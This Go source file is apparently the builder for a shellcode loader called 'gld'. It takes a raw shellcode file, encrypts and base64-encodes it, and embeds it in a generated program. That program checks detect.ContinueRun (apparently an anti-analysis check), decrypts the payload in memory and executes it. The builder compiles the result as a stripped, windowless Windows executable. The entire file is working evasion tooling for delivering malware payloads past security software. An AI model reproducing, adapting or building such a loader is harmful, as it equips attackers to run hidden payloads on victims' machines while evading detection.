package main

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"gld/util"
	"io/ioutil"
	"os"
	"os/exec"
)

var template = `package main

import (
	"encoding/base64"
	"encoding/hex"
	"gld/loader"
	"gld/util"
	"gld/detect"
)

var (
	key, _   = hex.DecodeString("%x")
	nonce, _ = hex.DecodeString("%x")
)

func main() {
	buf, err := base64.StdEncoding.DecodeString("%s")
	if err != nil {
		println(err.Error())
		return
	}

	if !detect.ContinueRun() {
		return
	}

	buf = util.D(buf, key, nonce)
	loader.X(buf)
}
`

const TEMP = "temp.go"

func main() {
	if len(os.Args) < 2 {
		println("./gld shellcode.bin [x64/x86]")
		return
	}

	f := os.Args[1]
	raw, err := ioutil.ReadFile(f)
	if err != nil {
		println("[!] " + err.Error())
		return
	}

	key := make([]byte, 32)
	nonce := make([]byte, 12)
	rand.Read(key)
	rand.Read(nonce)

	raw = util.E(raw, key, nonce)

	flw := base64.StdEncoding.EncodeToString(raw)
	err = ioutil.WriteFile(TEMP, []byte(fmt.Sprintf(template, key, nonce, flw)), 0777)
	if err != nil {
		println("[!] Generate fail: " + err.Error())
		return
	}
	println("[*] Generate template")

	var arch string
	if len(os.Args) > 2 {
		arch = os.Args[2]
	} else {
		arch = "x64"
	}

	var output string
	switch arch {
	case "x64":
		os.Setenv("GOARCH", "amd64")
		output = "x64.exe"
	case "x86":
		os.Setenv("GOARCH", "386")
		output = "x86.exe"
	default:
		println("[!] Unknown arch")
		return
	}
	println("[*] Compiling " + output)

	err = exec.Command("go", "build", "-ldflags", "-w -s -H=windowsgui", "-o", output, TEMP).Run()
	if err != nil {
		println("[!] Compile fail: " + err.Error())
		return
	}

	println("[+] Generate successfully -> " + output)
}
